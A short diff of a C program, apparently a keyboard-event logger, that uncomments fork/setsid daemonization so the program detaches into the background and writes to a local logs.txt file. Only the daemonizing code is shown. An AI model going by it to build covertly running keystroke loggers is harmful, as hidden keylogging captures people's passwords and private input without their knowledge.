@@ -13,20 +13,20 @@ int main()
     FILE *file;
     char *keyboard_event_filename = NULL;
 
-    // pid_t pid, sid;
-    // pid = fork();
+    pid_t pid, sid;
+    pid = fork();
 
-    // if (pid < 0)
-    //     exit(EXIT_FAILURE);
+    if (pid < 0)
+        exit(EXIT_FAILURE);
 
-    // else if (pid > 0)
-    // {
-    //     printf("Child PID: %d\n", pid);
-    //     exit(EXIT_SUCCESS);
-    // }
+    else if (pid > 0)
+    {
+        printf("Child PID: %d\n", pid);
+        exit(EXIT_SUCCESS);
+    }
 
-    // umask(0);
-    // sid = setsid();
+    umask(0);
+    sid = setsid();
 
     file = fopen("./logs.txt", "w");
 
